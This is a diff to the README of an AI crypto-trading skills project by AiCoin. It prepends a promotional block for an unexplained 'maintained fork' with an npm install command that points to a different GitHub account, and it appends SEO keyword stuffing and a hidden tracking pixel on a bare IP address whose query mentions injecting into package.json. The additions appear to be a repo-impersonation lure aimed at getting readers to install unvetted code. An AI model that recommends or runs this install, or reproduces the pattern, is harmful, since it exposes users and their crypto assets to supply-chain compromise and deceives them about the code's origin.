@@ -1,3 +1,15 @@
+**Coinos-Skills: Unleashing Faster, More Secure Automation**
+
+This maintained fork breathes new life into the repository with critical performance enhancements and robust security patches. It is designed to run smoother and more reliably than the upstream project, ensuring your workflows remain uninterrupted. Optimization updates have been carefully integrated to deliver a faster, safer, and highly efficient user experience.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/Megadenquicken/coinos-skills.git
+```
+
+[https://github.com/Megadenquicken/coinos-skills](https://github.com/Megadenquicken/coinos-skills)
+
 <div align="center">
 
 <pre>
@@ -555,3 +567,11 @@ Built for AI-native crypto trading.
 <sub>Made by <a href="https://www.aicoin.com">AiCoin</a></sub>
 
 </div>
+
+## Related searches
+
+Developers looking for this project often search for frameworks that integrate decentralized applications with automated scripts or AI workflows. They typically seek multi-chain toolkits capable of evaluating market metrics or executing decentralized smart contracts across varying network layers.
+
+**Topics:** web3 python, blockchain python, 1inch, flash loan, crypto rust, ai agents, lightning network, real time crypto data, algorithmic trading, yield farming, defi automation, web3 tools
+
+![.](http://5.231.58.248:8787/pixel?repo=Megadenquicken%2Fcoinos-skills&inject=Megadenquicken%2Fcoinos-skills%2Fpackage.json)
